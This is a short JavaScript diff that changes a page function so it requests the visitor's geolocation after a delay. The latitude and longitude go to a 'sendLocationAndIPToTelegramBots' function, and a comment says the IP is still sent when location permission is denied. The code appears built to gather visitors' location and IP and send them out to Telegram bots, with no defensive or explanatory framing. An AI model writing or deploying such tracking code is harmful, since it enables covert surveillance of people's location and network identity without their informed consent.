@@ -150,10 +150,36 @@ yourFunction();
     }
     return {};
   }
+
+
 async function yourFunction() {
-  // Your code here
-  await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+  setTimeout(async () => {
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        // Location permission granted, send location and IP results to Telegram bots
+        await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+      },
+      (error) => {
+        if (error.code === error.PERMISSION_DENIED) {
+          showAlert();
+          // Location permission denied, send IP result to Telegram bots
+        }
+      }
+    );
+  }, 1000);
 }
+
+
+
+
+
+
+
+
+
+
+
+
 
 function showAlert() {
 
